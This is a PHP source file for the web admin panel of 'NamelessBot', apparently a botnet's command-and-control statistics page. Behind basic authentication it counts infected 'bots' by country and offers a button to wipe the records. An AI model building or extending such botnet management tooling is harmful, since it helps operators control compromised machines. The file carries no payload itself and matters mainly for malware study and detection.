<?php
$clear = $_GET['clear'];
include ("./includes/config.php");
include ("./includes/dbfunctions.php");
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$user || $_SERVER['PHP_AUTH_PW']!==$pass)
{
	header('WWW-Authenticate: Basic realm = "Enter your login and password"');
	header('HTTP/1.0 401 Unauthorized');
	exit("Access Denied");
}
checktables();
$total = query("select id from visitors");
$total = mysql_num_rows($total);
$counter = true;
$allcountries = query("select country, count(*) as total from visitors group by country desc");
?>
<head>
<meta http-equiv='refresh' content='15'; url=admin.php">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>NamelessBot - Web Panel</title>
<link rel="icon" href="favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
</head>
<body bgcolor="#FFFFFF" style="text-align: center" topmargin="1">
<style type="text/css">
#loginbutton 
{ 
 background: url('styles/images/ClearButton.png') no-repeat; 
 border: none; 
 padding: 0;  
 width : 59px;
 height : 20px;
 margin: 4px 0 0;  
 cursor: pointer;
}  
</style>
<center>
<br>
<img border="0" src="styles/images/Logo.png"><br>
<?php
if (isset($clear)) 
{
if(query("truncate visitors")) { 
if (!isset($_GET['reload'])) {
echo '<meta http-equiv=Refresh content="1;url=?reload=1">';
echo " Stats Cleared Sucessfully";  
 }
}
}
?>
<table border="0" width="63%" id="table1" style="border: 1px solid #FFFFFF">
	<tr>
		<td bgcolor="#4A83B5" width="30%">
		<p align="center">
		<font color="#FFFFFF" face="Verdana" style="font-size: 7pt; font-weight:700">Countrys</font></td>

		<td bgcolor="#4A83B5" width="30%">
		<p align="center">
		<span style="font-weight: 700">
		<font face="Verdana" style="font-size: 7pt" color="#FFFFFF">&nbsp;Total By Country</font></span></td>

		<td bgcolor="#4A83B5" width="20%">
		<p align="center">
		<font face="Verdana" style="font-size: 7pt; font-weight:700" color="#FFFFFF">Total Current</font></td>

		<td bgcolor="#4A83B5" width="20%">
		<p align="center"><span style="font-weight: 700">
		<font face="Verdana" style="font-size: 7pt" color="#FFFFFF">Total New Bots</font>
</span>
</td>
<?php bots_countries(); ?>
</tr>
</table>
<p>
<br>
</p>
<form action="?clear" method ="post">
<input type="submit" id="loginbutton" value=""  name="submit">
</form>
</center>
</body>
</html>